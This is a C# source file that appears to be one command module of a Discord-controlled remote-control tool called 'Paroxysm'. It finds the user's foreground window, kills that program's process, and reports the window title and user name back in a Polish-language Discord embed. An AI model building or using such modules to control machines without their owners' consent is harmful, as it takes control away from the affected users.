using Discord;
using Paroxysm.Discord;
using Paroxysm.Tools;
using Paroxysm.Hooks;
using System.Text;
using System.Diagnostics;

namespace Paroxysm.Hooks.Actions;

public static class CloseWinAction
{
    public static Embed Follow()
    {
        IntPtr foregroundWindowHandle = HookStatement.GetForegroundWindow();
        if (foregroundWindowHandle == IntPtr.Zero) return DiscordEmbed.CreateWithText(Color.Red, "Brak aktywnego okna", "Użytkownik nie ma żadnego otwartego okna", Environment.UserName, null);

        StringBuilder windowTitle = new(256);
        HookStatement.GetWindowText(foregroundWindowHandle, windowTitle, windowTitle.Capacity);

        HookStatement.GetWindowThreadProcessId(foregroundWindowHandle, out int processId);
        Process process = Process.GetProcessById(processId);
        process.Kill();

        return DiscordEmbed.CreateWithText(Color.Green, "Zamknięto program", $"Program `{windowTitle.Replace("`", "\\`")}` został zamknięty", Environment.UserName, null);
    }
}